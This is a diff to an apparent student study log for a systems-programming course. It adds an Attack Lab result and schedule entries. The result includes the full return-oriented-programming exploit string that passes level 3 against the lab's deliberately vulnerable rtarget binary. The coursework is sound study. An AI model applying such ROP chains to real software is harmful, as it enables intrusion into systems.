@@ -52,6 +52,23 @@ Good work!  On to the next...
 Congratulations! You've defused the bomb!
 ```
 
+### Attack Lab
+
+- 花费时间：6小时
+- 难度：中等
+- 通过：5/5
+
+```txt
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 AD 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
+```
+
 ## 日程
 
 - 2026-05-27
@@ -83,3 +100,9 @@ Congratulations! You've defused the bomb!
   - Lecture: 08-09: Machine Level Programming IV-V Data - Advanced Topics
   - Notes: lec08-09
   - Textbook: Chapter 3.11 - Chapter 3.12
+- 2026-06-04
+  - LAB: Attack Lab
+- 2026-06-07
+  - Textbook: Chapter 5
+  - Lecture: 10: Program Optimization
+  
